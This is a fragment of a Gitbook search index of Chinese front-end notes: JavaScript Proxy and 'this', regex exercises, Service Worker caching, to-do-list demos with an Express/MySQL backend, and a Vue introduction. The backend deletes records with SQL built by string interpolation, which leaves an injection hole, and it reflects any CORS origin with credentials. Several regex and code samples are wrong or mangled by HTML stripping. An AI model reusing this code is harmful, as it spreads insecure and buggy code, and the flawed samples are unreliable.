Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象。 defineProperty(target, propKey, propDesc) 拦截 Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值。 preventExtensions(target) 拦截 Object.preventExtensions(proxy)，返回一个布尔值。 getPrototypeOf(target) 拦截 Object.getPrototypeOf(proxy)，返回一个对象。 isExtensible(target) 拦截 Object.isExtensible(proxy)，返回一个布尔值。 setPrototypeOf(target, proto) 拦截 Object.setPrototypeOf(proxy, proto)，返回一个布尔值。如果目标对象是函数，那么还有两种额外操作可以拦截。 apply(target, object, args) 拦截 Proxy 实例作为函数调用的操作，比如 proxy(...args)、proxy.call(object, ...args)、proxy.apply(...)。 construct(target, args) 拦截 Proxy 实例作为构造函数调用的操作，比如 new proxy(...args)。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:33 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/15.this.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/15.this.html","title":"15.this","keywords":"","body":"this this 的指向有哪几种情况？ this 代表函数调用相关联的对象，通常页称之为执行上下文。 作为函数直接调用，非严格模式下，this 指向 window，严格模式下，this 指向 undefined； 作为某对象的方法调用，this 通常指向调用的对象。 使用 apply、call、bind 可以绑定 this 的指向。 在构造函数中，this 指向新创建的对象 箭头函数没有单独的 this 值，this 在箭头函数创建时确定，它与声明所在的上下文相同。 如果对一个函数进行多次 bind，那么上下文会是什么呢？ let a = {}; let fn = function () { console.log(this); }; fn.bind().bind(a)(); // => ? 不管我们给函数 bind 几次，fn 中的 this 永远由第一次 bind 决定，所以结果永远是 window。 // fn.bind().bind(a) 等于 let fn2 = function fn1() { return function () { return fn.apply(); }.apply(a); }; fn2(); 多个 this 规则出现时，this 最终指向哪里？ 首先，new 的方式优先级最高，接下来是 bind 这些函数，然后是 obj.foo() 这种调用方式，最后是 foo 这种调用方式，同时，箭头函数的 this 一旦被绑定，就不会再被任何方式所改变。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:31 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/16.正则.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/16.正则.html","title":"16.正则","keywords":"","body":"正则表达式 创建正则表达式 使用一个正则表达式字面量 const regex = /^[a-zA-Z]+[0-9]*\\W?_$/gi; 调用 RegExp 对象的构造函数 const regex = new RegExp(pattern, [, flags]); 特殊字符 ^ 匹配输入的开始 $ 匹配输入的结束 * 0 次或多次 {0，} + 1 次或多次 {1，} ? 0 次或者 1 次 {0,1}。 用于先行断言 如果紧跟在任何量词 *、 +、? 或 {} 的后面，将会使量词变为非贪婪 对 \"123abc\" 用 /\\d+/ 将会返回 \"123\"， 用 /\\d+?/,那么就只会匹配到 \"1\"。 . 匹配除换行符之外的任何单个字符 (x) 匹配 'x' 并且记住匹配项 (?:x) 匹配 'x' 但是不记住匹配项 x(?=y) 配'x'仅仅当'x'后面跟着'y'.这种叫做正向肯定查找。 x(?!y) 匹配'x'仅仅当'x'后面不跟着'y',这个叫做正向否定查找。 x|y 匹配‘x’或者‘y’。 {n} 重复 n 次 {n, m} 匹配至少 n 次，最多 m 次 [xyz] 代表 x 或 y 或 z xyz 不是 x 或 y 或 z \\d 数字 \\D 非数字 \\s 空白字符，包括空格、制表符、换页符和换行符。 \\S 非空白字符 \\w 单词字符（字母、数字或者下划线） [A-Za-z0-9_] \\W 非单字字符。a-za-z0-9_ \\3 表示第三个分组 \\b 词的边界 /\\bm/匹配“moon”中得‘m’； \\B 非单词边界 使用正则表达式的方法 exec 一个在字符串中执行查找匹配的 RegExp 方法，它返回一个数组（未匹配到则返回 null）。 test 一个在字符串中测试是否匹配的 RegExp 方法，它返回 true 或 false。 match 一个在字符串中执行查找匹配的 String 方法，它返回一个数组或者在未匹配到时返回 null。 search 一个在字符串中测试匹配的 String 方法，它返回匹配到的位置索引，或者在失败时返回-1。 replace 一个在字符串中执行查找匹配的 String 方法，并且使用替换字符串替换掉匹配到的子字符串。 split 一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的子字符串存储到数组中的 String 方法。 练习 匹配结尾的数字 /\\d+$/g; 统一空格个数 字符串内如有空格，但是空格的数量可能不一致，通过正则将空格的个数统一变为一个。 let reg = /\\s+/g; str.replace(reg, \" \"); 判断字符串是不是由数字组成 str.test(/^\\d+$/); 电话号码正则 区号必填为 3-4 位的数字 区号之后用“-”与电话号码连接电话号码为 7-8 位的数字 分机号码为 3-4 位的数字，非必填，但若填写则以“-”与电话号码相连接 /^\\d{3,4}-\\d{7,8}(-\\d{3,4})?$/; 手机号码正则表达式 正则验证手机号，忽略前面的 0，支持 130-139，150-159。忽略前面 0 之后判断它是 11 位的。 /^0*1(3|5)\\d{9}$/; 使用正则表达式实现删除字符串中的空格 funtion trim(str) { let reg = /^\\s+|\\s+$/g return str.replace(reg, ''); } 限制文本框只能输入数字和两位小数点等等 /^\\d*\\.\\d{0,2}$/; 只能输入小写的英文字母和小数点，和冒号，正反斜杠(：./) /^[a-z\\.:\\/\\\\]*$/; 替换小数点前内容为指定内容 例如：infomarket.php?id=197 替换为 test.php?id=197 var reg = /^[^\\.]+/; var target = \"---------\"; str = str.replace(reg, target); 只匹配中文的正则表达式 /[\\u4E00-\\u9FA5\\uf900-\\ufa2d]/gi; 返回字符串的中文字符个数 先去掉非中文字符，再返回 length 属性。 function cLength(str) { var reg = /[^\\u4E00-\\u9FA5\\uf900-\\ufa2d]/g; //匹配非中文的正则表达式 var temp = str.replace(reg, \"\"); return temp.length; } 正则表达式取得匹配 IP 地址前三段 只要匹配掉最后一段并且替换为空字符串就行了 function getPreThrstr(str) { let reg = /\\.\\d{1,3}$/; return str.replace(reg, \"\"); } 匹配与之间的内容 /[\\s\\S]+?/i 用正则表达式获得文件名 c:\\images\\tupian\\006.jpg 可能是直接在盘符根目录下，也可能在好几层目录下，要求替换到只剩文件名。 首先匹配非左右斜线字符 0 或多个，然后是左右斜线一个或者多个。 function getFileName(str) { var reg = /[^\\\\\\/]*[\\\\\\/]+/g; // xxx\\ 或是 xxx/ str = str.replace(reg, \"\"); return str; } 绝对路径变相对路径 \"http://23.123.22.12/image/somepic.gif\"转换为：\"/image/somepic.gif\" var reg = /http:\\/\\/[^\\/]+/; str = str.replace(reg, \"\"); 用户名正则 用于用户名注册，，用户名只 能用 中文、英文、数字、下划线、4-16 个字符。 /^[\\u4E00-\\u9FA5\\uf900-\\ufa2d\\w]{4,16}$/; 匹配英文地址 规则如下: 包含 \"点\", \"字母\",\"空格\",\"逗号\",\"数字\"，但开头和结尾不能是除字母外任何字符。 /^[a-zA-Z][\\.a-zA-Z,0-9]*[a-zA-Z]$/; 正则匹配价格 开头数字若干位，可能有一个小数点，小数点后面可以有两位数字。 /^\\d+(\\.\\d{2})?$/; 身份证号码的匹配 身份证号码可以是 15 位或者是 18 位，其中最后一位可以是 X。其它全是数字 /^(\\d{14}|\\d{17})(X|x)$/; 单词首字母大写 每单词首字大写，其他小写。如 blue idea 转换为 Blue Idea，BLUE IDEA 也转换为 Blue Idea function firstCharUpper(str) { str = str.toLowerCase(); let reg = /\\b(\\w)/g; return str.replace(reg, (m) => m.toUpperCase()); } 正则验证日期格式 yyyy-mm-dd 格式 4 位数字，横线，1 或者 2 位数字，再横线，最后又是 1 或者 2 位数字。 /^\\d{4}-\\d{1,2}-\\d{1,2}$/; 去掉文件的后缀名 www.abc.com/dc/fda.asp 变为 www.abc.com/dc/fda function removeExp(str) { return str.replace(/\\.\\w$/, \"\"); } 验证邮箱的正则表达式 开始必须是一个或者多个单词字符或者是-，加上@，然后又是一个或者多个单词字符或者是-。然后是点“.”和单词字符和-的组合，可以有一个或者 多个组合。 /^[\\w-]+@\\w+\\.\\w+$/; 正则判断标签是否闭合 例如： p的内容，同样也是没闭合的标签。 标签可能有两种方式闭合， 或者是 xxx 。 /[\\s\\S]*?()+|\\s*\\/>)/i; 正则判断是否为数字与字母的混合 不能小于 12 位，且必须为字母和数字的混 /^(([a-z]+[0-9]+)|([0-9]+[a-z]+))[a-z0-9]*$/i; 将阿拉伯数字替换为中文大写形式 function replaceReg(reg, str) { let arr = [\"零\", \"壹\", \"贰\", \"叁\", \"肆\", \"伍\", \"陆\", \"柒\", \"捌\", \"玖\"]; let reg = /\\d/g; return str.replace(reg, function (m) { return arr[m]; }); } 去掉标签的所有属性 *** 变成没有任何属性的 *** 思路：非捕获匹配属性，捕获匹配标签，使用捕获结果替换掉字符串。正则如下： /()/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:30 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/17.ServiceWorker.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/17.ServiceWorker.html","title":"17.ServiceWorker","keywords":"","body":"Service Worker Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 Service Worker 的话，传输协议必须为 HTTPS。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全。 Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。以下是这个步骤的实现： // index.js if (navigator.serviceWorker) { navigator.serviceWorker .register(\"sw.js\") .then(function (registration) { console.log(\"service worker 注册成功\"); }) .catch(function (err) { console.log(\"servcie worker 注册失败\"); }); } // sw.js // 监听 `install` 事件，回调中缓存所需文件 self.addEventListener(\"install\", (e) => { e.waitUntil( caches.open(\"my-cache\").then(function (cache) { return cache.addAll([\"./index.html\", \"./index.js\"]); }) ); }); // 拦截所有请求事件 // 如果缓存中已经有请求的数据就直接用缓存，否则去请求数据 self.addEventListener(\"fetch\", (e) => { e.respondWith( caches.match(e.request).then(function (response) { if (response) { return response; } console.log(\"fetch source\"); }) ); }); 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了 在 Cache 中也可以发现我们所需的文件已被缓存 当我们重新刷新页面可以发现我们缓存的数据是从 Service Worker 中读取的 好文链接 https://www.zcfy.cc/article/service-worker-what-are-you-mariko-kosaka-1927.html https://juejin.im/post/5ba0fe356fb9a05d2c43a25c https://juejin.im/post/5bf3f656e51d45338e084044 https://juejin.im/post/5bf3f6b2e51d45360069e527 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:28 "},"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/01.通过bootstrap完成简单的todolist.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/01.通过bootstrap完成简单的todolist.html","title":"01.通过bootstrap完成简单的todolist","keywords":"","body":"%pageLock% 要求 界面美观 有输入，显示 通过javascript操作dom 点击删除能删除指定元素 有序列表或者自己生成列表 样式如下 代码实现 todoList #div_id_input_box{ margin-top: 2rem; margin-left: 2rem; display: flex; height: 34px; line-height: 34px; } #input_id_value{ width: 80%; margin: 0 2rem; } .li_class_content{ margin-top: 2rem; } .button_class{ margin-left: 2rem; } ToDoList 添加 let input = document.getElementById('input_id_value') let ol = document.getElementById('ol_id_content') window.onload = function(){ input.value = '' } function add(){ let li = document.createElement('li') let text = document.createTextNode(input.value) li.setAttribute('class','li_class_content') let button = document.createElement('button') button.innerHTML='删除' button.setAttribute('class','btn btn-danger button_class btn-xs') button.setAttribute('type','button') button.addEventListener('click',deleteLi.bind(li,li),false) li.append(text) li.append(button) ol.appendChild(li) input.value = '' } function deleteLi(e,a){ ol.removeChild(e) } 解析 HTML input 框输入可以通过dom.value获取 使ol 完成有序列表布局，并且使用其作为容器，来装载li CSS 标签加载bootstrap css JavaScript document.createElement() 创建标签 document.createTextNode()创建文本节点 dom.setAttribute() 设置dom的属性 dom.addEventListener给dom绑定事件 function.bind(this,[args]) bind函数创建一个新函数，并且绑定函数会以创建它时传入bind方法的第一个参数作为this 最重要的是 bind函数 这样才能实现点击删除能删除指定元素要求 剩下为使用javascript操作dom，设置属性，就没有什么了 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-22 22:30:45 "},"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/02.在01的基础上完成数据装载.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/02.在01的基础上完成数据装载.html","title":"02.在01的基础上完成数据装载","keywords":"","body":"%pageLock% 要求 界面美观 有输入，显示 通过javascript操作dom 点击删除能删除指定元素 有序列表或者自己生成列表 创建一个array，当windows.onload之后，将array的数据展示在页面上 样式如下： 代码实现 todoList #div_id_input_box{ margin-top: 2rem; margin-left: 2rem; display: flex; height: 34px; line-height: 34px; } #input_id_value{ width: 80%; margin: 0 2rem; } .li_class_content{ margin-top: 2rem; } .button_class{ margin-left: 2rem; } ToDoList 添加 let input = document.getElementById('input_id_value') let ol = document.getElementById('ol_id_content') let liArray = ['吃饭','睡觉','打豆豆','哈哈哈','嘻嘻嘻'] window.onload = function(){ input.value = '' for(let value of liArray){ add(value) } } function add(data) { let li = document.createElement('li') let text = '' if(data === undefined){ text = document.createTextNode(input.value) }else{ text = document.createTextNode(data) } li.setAttribute('class','li_class_content') let button = document.createElement('button') button.innerHTML='删除' button.setAttribute('class','btn btn-danger button_class btn-xs') button.setAttribute('type','button') button.addEventListener('click',deleteLi.bind(li,li),false) li.append(text) li.append(button) ol.appendChild(li) input.value = '' } function deleteLi(e){ ol.removeChild(e) } [!TIP] 这里需要注意的是因为是通过add函数（button共用同一个函数），这里就需要传入参数用于装载array中的值，在参数中就需要判断是否有值，在没有值的情况下就为input框输入的值 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-22 23:16:04 "},"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/03.在01的基础上完成ajax获取数据并实时同步服务器.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/04.ToDoListDemo/03.在01的基础上完成ajax获取数据并实时同步服务器.html","title":"03.在01的基础上完成ajax获取数据并实时同步服务器","keywords":"","body":"%pageLock% 要求 界面美观 有输入，显示 通过javascript操作dom 点击删除能删除指定元素 有序列表或者自己生成列表 使用ajax获取后端数据，并且点击提交使用ajax发送数据到后端，并存储到数据库，点击删除，删除指定元素并使用ajax访问后端，并实现在数据库中删除 接口文档 接口 方法 数据类型 请求体 响应体 备注 /selectAll POST application/json null Array[ { \"id\": 126, \"value\": \"吃饭\" }, { \"id\": 127, \"value\": \"睡觉\" }, { \"id\": 128, \"value\": \"看王扯火\" }, { \"id\": 129, \"value\": \"打豆豆\" }] /submitAll POST application/json Array[ { \"value\": \"吃饭\" }, { \"value\": \"睡觉\" }, { \"value\": \"看王扯火\" }, { \"value\": \"打豆豆\" }] status_code:200 /add POST application/json Object{ value: 'test' } status_code:200 通过传递value在数据库中增加，不用传id（id为索引） /deleteRecord POST application/json Object{id: 131} status_code:200 通过id删除 代码实现 后端 // app.js const express = require('express') const app = new express() const bodyParser = require('body-parser') const jsonParser = bodyParser.json() const sqlDao = require('./sql.js') app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', req.headers.origin) //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies7 res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.post('/selectAll',async (req,res)=>{ let sql = `select * from event` try{ let results = await sqlDao.selectData(sql) console.log(results) res.send(results) }catch(e){ res.send(e) } }) app.post('/submitAll',jsonParser,async (req,res)=>{ let array = [] for(let i = 0,len = req.body.length; i { let sql = `insert into event(value) values (?)` try{ let result = await sqlDao.insertData(sql,req.body.value) res.sendStatus(200) }catch(e){ res.send(e) } }) app.post('/deleteRecord',jsonParser,async(req,res)=>{ let sql = `delete from event where id = ${req.body.id}` try{ console.log(req.body.id) await sqlDao.deleteData(sql) res.sendStatus(200) }catch(e){ res.send(e) } }) app.listen(8080,()=>{ console.log('running!') }) //sql.js const mysql = require('mysql') const con = mysql.createPool({ host: '127.0.0.1', user: 'root', password: '****************', port: '3306', database: 'Test', }) // con.connect() module.exports = { selectData(sql) { return new Promise((resolve, reject) => { try { con.query(sql, (err, result) => { if (err) { reject(err) } else { resolve(result) } }) } catch (e) { reject(e) } }) }, insertData(sql, sqlParams) { return new Promise((resolve, reject) => { try { con.query(sql, sqlParams, (err, result) => { if (err) { reject(err) } else { resolve(result) } }) } catch (e) { reject(e) } }) }, updateData(sql) { return new Promise((resolve, reject) => { try { con.query(sql, (err, result) => { if (err) { reject(err) } else { resolve(result) } }) } catch (e) { reject(e) } }) }, deleteData(sql) { return new Promise((resolve, reject) => { try { con.query(sql, (err, result) => { if (err) { reject(err) } else { resolve(result) } }) } catch (e) { reject(e) } }) }, } 前端 todoList #div_id_input_box{ margin-top: 2rem; margin-left: 2rem; display: flex; height: 34px; line-height: 34px; } #input_id_value{ width: 80%; margin: 0 2rem; } .li_class_content{ margin-top: 2rem; } .button_class{ margin-left: 2rem; } ToDoList 添加 let input = document.getElementById('input_id_value') let ol = document.getElementById('ol_id_content') window.onload = function(){ input.value = '' getAll() } function getAll(){ let url = 'http://127.0.0.1:8080/selectAll' ajaxContent(null,url,function(data){ let liArray = JSON.parse(data) for(let data of liArray){ let li = document.createElement('li') li.setAttribute('class','li_class_content') let button = document.createElement('button') button.innerHTML = '删除' button.setAttribute('class','btn btn-danger button_class btn-xs') button.setAttribute('type','button') button.addEventListener('click',deleteLi.bind(li,li,data.id),false) li.append(data.value) li.append(button) ol.appendChild(li) } }) } function add() { let text = document.createTextNode(input.value) ajaxContent({value:text.data},'http://127.0.0.1:8080/add',function(){ input.value = '' let liArray = ol.childNodes if(liArray.length > 0){ for(let i = liArray.length - 1 ;i > 0; i --){ ol.removeChild(liArray[i]) } } getAll() }) } function deleteLi(e,id){ ajaxContent({id:id},'http://127.0.0.1:8080/deleteRecord',function(){ let liArray = ol.childNodes if(liArray.length > 0){ for(let i = liArray.length - 1 ;i > 0; i --){ ol.removeChild(liArray[i]) } } getAll() }) } function ajaxContent(data,url,callback){ let xhr = new XMLHttpRequest() xhr.open('POST',url) xhr.setRequestHeader('Content-Type','application/json') data = JSON.stringify(data) xhr.send(data) xhr.onreadystatechange = function(){ if(xhr.readyState === 4){ if(xhr.status === 200) { callback(xhr.responseText) } } } } [!TIP] 状态更新需要使用/selectAll 接口获取数据库中所有的数据，当获取所有的数据就需要将最未更新的节点销毁，然后再用来装载新的数据 ajax 为异步，需要使用回调函数直到获取到数据之后，再更新节点（async/await 也行） removeChild， 在for循环的时候一定要倒序删除，才能避免删不干净的情况。浏览器会把空行当做一个子节点，会占一行位置，导致删除失败 状态更新，需要在调用/add 接口之后再调用一遍/selectAll，需要前端重新渲染，来达到数据双向绑定的效果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-22 23:16:07 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/","title":"01.Vue.js","keywords":"","body":"什么是 Vue？ Vue (发音为 /vjuː/，类似 view) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript 构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。 下面是一个最基本的示例： import { createApp } from 'vue' createApp({ data() { return { count: 0 } } }).mount('#app') Count is: {{ count }} 上面的示例展示了 Vue 的两个核心功能： 声明式渲染：Vue 基于标准 HTML 拓展了一套模板语法，使得我们可以声明式地描述最终输出的 HTML 和 JavaScript 状态之间的关系。 响应性：Vue 会自动跟踪 JavaScript 状态并在其发生变化时响应式地更新 DOM。 你可能已经有了些疑问——先别急，在后续的文档中我们会详细介绍每一个细节。现在，请继续看下去，以确保你对 Vue 作为一个框架到底提供了什么有一个宏观的了解。 渐进式框架 Vue 是一个框架，也是一个生态。其功能覆盖了大部分前端开发常见的需求。但 Web 世界是十分多样化的，不同的开发者在 Web 上构建的东西可能在形式和规模上会有很大的不同。考虑到这一点，Vue 的设计非常注重灵活性和“可以被逐步集成”这个特点。根据你的需求场景，你可以用不同的方式使用 Vue： 无需构建步骤，渐进式增强静态的 HTML 在任何页面中作为 Web Components 嵌入 单页应用 (SPA) 全栈 / 服务端渲染 (SSR) Jamstack / 静态站点生成 (SSG) 开发桌面端、移动端、WebGL，甚至是命令行终端中的界面 单文件组件 在大多数启用了构建工具的 Vue 项目中，我们可以使用一种类似 HTML 格式的文件来书写 Vue 组件，它被称为单文件组件 (也被称为 *.vue 文件，英文 Single-File Components，缩写为 SFC)。顾名思义，Vue 的单文件组件会将一个组件的逻辑 (JavaScript)，模板 (HTML) 和样式 (CSS) 封装在同一个文件里。下面我们将用单文件组件的格式重写上面的计数器示例： export default { data() { return { count: 0 } } } Count is: {{ count }} button { font-weight: bold; } 单文件组件是 Vue 的标志性功能。如果你的用例需要进行构建，我们推荐用它来编写 Vue 组件。但你暂时只需要知道 Vue 会帮忙处理所有这些构建工具的配置就好。 API 风格 Vue 的组件可以按两种不同的风格书写：选项式 API 和组合式 API。 选项式 API (Options API) 使用选项式 API，我们可以用包含多个选项的对象来描述组件的逻辑，例如 data、methods 和 mounted。选项所定义的属性都会暴露在函数内部的 this 上，它会指向当前的组件实例。 export default { // data() 返回的属性将会成为响应式的状态 // 并且暴露在 `this` 上 data() { return { count: 0 } }, // methods 是一些用来更改状态与触发更新的函数 // 它们可以在模板中作为事件处理器绑定 methods: { increment() { this.count++ } }, // 生命周期钩子会在组件生命周期的各个不同阶段被调用 // 例如这个函数就会在组件挂载完成后被调用 mounted() { console.log(`The initial count is ${this.count}.`) } } Count is: {{ count }} 组合式 API (Composition API) 通过组合式 API，我们可以使用导入的 API 函数来描述组件逻辑。在单文件组件中，组合式 API 通常会与搭配使用。这个 setup attribute 是一个标识，告诉 Vue 需要在编译时进行一些处理，让我们可以更简洁地使用组合式 API。比如， 中的导入和顶层变量/函数都能够在模板中直接使用。 下面是使用了组合式 API 与 改造后和上面的模板完全一样的组件： import { ref, onMounted } from 'vue' // 响应式状态 const count = ref(0) // 用来修改状态、触发更新的函数 function increment() { count.value++ } // 生命周期钩子 onMounted(() => { console.log(`The initial count is ${count.value}.`) }) Count is: {{ count }} 该选哪一个？ 两种 API 风格都能够覆盖大部分的应用场景。它们只是同一个底层系统所提供的两套不同的接口。实际上，选项式 API 是在组合式 API 的基础上实现的！关于 Vue 的基础概念和知识在它们之间都是通用的。 选项式 API 以“组件实例”的概念为中心 (即上述例子中的 this)，对于有面向对象语言背景的用户来说，这通常与基于类的心智模型更为一致。同时，它将响应性相关的细节抽象出来，并强制按照选项来组织代码，从而对初学者而言更为友好。 组合式 API 的核心思想是直接在函数作用域内定义响应式状态变量，并将从多个函数中得到的状态组合起来处理复杂问题。这种形式更加自由，也需要你对 Vue 的响应式系统有更深的理解才能高效使用。相应的，它的灵活性也使得组织和重用逻辑的模式变得更加强大。 快速上手 创建一个Vue 应用 确保你安装了最新版本的 Node.js，并且你的当前工作目录正是打算创建项目的目录 npm init vue@latest 这一指令将会安装并执行 create-vue，它是 Vue 官方的项目脚手架工具。你将会看到一些诸如 TypeScript 和测试支持之类的可选功能提示： ✔ Project name: … ✔ Add TypeScript? … No / Yes ✔ Add JSX Support? … No / Yes ✔ Add Vue Router for Single Page Application development? … No / Yes ✔ Add Pinia for state management? … No / Yes ✔ Add Vitest for Unit testing? … No / Yes ✔ Add an End-to-End Testing Solution? … No / Cypress / Playwright ✔ Add ESLint for code quality? … No / Yes ✔ Add Prettier for code formatting? … No / Yes Scaffolding project in ./... Done. 如果不确定是否要开启某个功能，你可以直接按下回车键选择 No。在项目被创建后，通过以下步骤安装依赖并启动开发服务器： cd npm install npm run serve 你现在应该已经运行起来了你的第一个 Vue 项目！请注意，生成的项目中的示例组件使用的是组合式 API 和 ，而非选项式 API。 当你准备将应用发布到生产环境时，请运行： npm run build 此命令会在 ./dist 文件夹中为你的应用创建一个生产环境的构建版本。 通过 CDN 使用 Vue 你可以借助 script 标签直接通过 CDN 来使用 Vue： 通过 CDN 使用 Vue 时，不涉及“构建步骤”。这使得设置更加简单，并且可以用于增强静态的 HTML 或与后端框架集成。但是，你将无法使用单文件组件 (SFC) 语法。 使用全局构建版本 上面的例子使用了全局构建版本的 Vue，该版本的所有顶层 API 都以属性的形式暴露在了全局的 Vue 对象上。这里有一个使用全局构建版本的例子 {{ message }} const { createApp } = Vue createApp({ data() { return { message: 'Hello Vue!' } } }).mount('#app') 使用 ES 模块构建版本 在本文档的其余部分我们使用的主要是 ES 模块语法。现代浏览器大多都已原生支持 ES 模块。因此我们可以像这样通过 CDN 以及原生 ES 模块使用 Vue： {{ message }} import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js' createApp({ data() { return { message: 'Hello Vue!' } } }).mount('#app') 启用 Import maps 在上面的示例中，我们使用了完整的 CDN URL 来导入，但在文档的其余部分中，你将看到如下代码： import { createApp } from 'vue' 我们可以使用导入映射表 (Import Maps) 来告诉浏览器如何定位到导入的 vue： { \"imports\": { \"vue\": \"https://unpkg.com/vue@3/dist/vue.esm-browser.js\" } } {{ message }} import { createApp } from 'vue' createApp({ data() { return { message: 'Hello Vue!' } } }).mount('#app') [!TIP] 导入映射表的浏览器支持情况 目前只有基于 Chromium 的浏览器支持导入映射表，所以我们推荐你在学习过程中使用 Chrome 或 Edge。 如果你使用的是 Firefox 浏览器，则该功能默认在 108+ 版本或通过启用 about:config 中的 dom.importMaps.enabled 选项支持。 如果你更喜欢那些还不支持导入映射表的浏览器，你可以使用 es-module-shims 来进行 polyfill。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 18:39:23 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/01.基础.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/01.基础.html","title":"01.基础","keywords":"","body":"创建一个Vue实例 应用实例 每个 Vue 应用都是通过 createApp 函数创建一个新的 应用实例： import { createApp } from 'vue' const app = createApp({ /* 根组件选项 */ }) 根组件 我们传入 createApp 的对象实际上是一个组件，每个应用都需要一个“根组件”，其他组件将作为其子组件。 如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。 import { createApp } from 'vue' // 从一个单文件组件中导入根组件 import App from './App.vue' const app = createApp(App) 虽然本指南中的许多示例只需要一个组件，但大多数真实的应用都是由一棵嵌套的、可重用的组件树组成的。例如，一个待办事项 (Todos) 应用的组件树可能是这样的： App (root component) ├─ TodoList │ └─ TodoItem │ ├─ TodoDeleteButton │ └─ TodoEditButton └─ TodoFooter ├─ TodoClearButton └─ TodoStatistics 挂载应用 应用实例必须在调用了 .mount() 方法后才会渲染出来。该方法接收一个“容器”参数，可以是一个实际的 DOM 元素或是一个 CSS 选择器字符串： app.mount('#app') 应用根组件的内容将会被渲染在容器元素里面。容器元素自己将不会被视为应用的一部分。 .mount() 方法应该始终在整个应用配置和资源注册完成后被调用。同时请注意，不同于其他资源注册方法，它的返回值是根组件实例而非应用实例。 DOM 中的根组件模板 根组件的模板通常是组件本身的一部分，但也可以直接通过在挂载容器内编写模板来单独提供： {{ count }} import { createApp } from 'vue' const app = createApp({ data() { return { count: 0 } } }) app.mount('#app') 当根组件没有设置 template 选项时，Vue 将自动使用容器的 innerHTML 作为模板 DOM 内模板通常用于无构建步骤的 Vue 应用程序。它们也可以与服务器端框架一起使用，其中根模板可能是由服务器动态生成的。 应用配置 应用实例会暴露一个 .config 对象允许我们配置一些应用级的选项，例如定义一个应用级的错误处理器，用来捕获所有子组件上的错误： app.config.errorHandler = (err) => { /* 处理错误 */ } 应用实例还提供了一些方法来注册应用范围内可用的资源，例如注册一个组件： app.component('TodoDeleteButton', TodoDeleteButton) 这使得 TodoDeleteButton 在应用的任何地方都是可用的。我们会在指南的后续章节中讨论关于组件和其他资源的注册。你也可以在 API 参考中浏览应用实例 API 的完整列表 确保在挂载应用实例之前完成所有应用配置 多个应用实例 应用实例并不只限于一个。createApp API 允许你在同一个页面中创建多个共存的 Vue 应用，而且每个应用都拥有自己的用于配置和全局资源的作用域。 const app1 = createApp({ /* ... */ }) app1.mount('#container-1') const app2 = createApp({ /* ... */ }) app2.mount('#container-2') 如果你正在使用 Vue 来增强服务端渲染 HTML，并且只想要 Vue 去控制一个大型页面中特殊的一小部分，应避免将一个单独的 Vue 应用实例挂载到整个页面上，而是应该创建多个小的应用实例，将它们分别挂载到所需的元素上去。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-08 10:37:50 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/02.模板语法.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/02.模板语法.html","title":"02.模板语法","keywords":"","body":"模板语法 Vue 使用一种基于 HTML 的模板语法，使我们能够声明式地将其组件实例的数据绑定到呈现的 DOM 上。所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析。 在底层机制中，Vue 会将模板编译成高度优化的 JavaScript 代码。结合响应式系统，当应用状态变更时，Vue 能够智能地推导出需要重新渲染的组件的最少数量，并应用最少的 DOM 操作。 如果你对虚拟 DOM 的概念比较熟悉，并且偏好直接使用 JavaScript，你也可以结合可选的 JSX 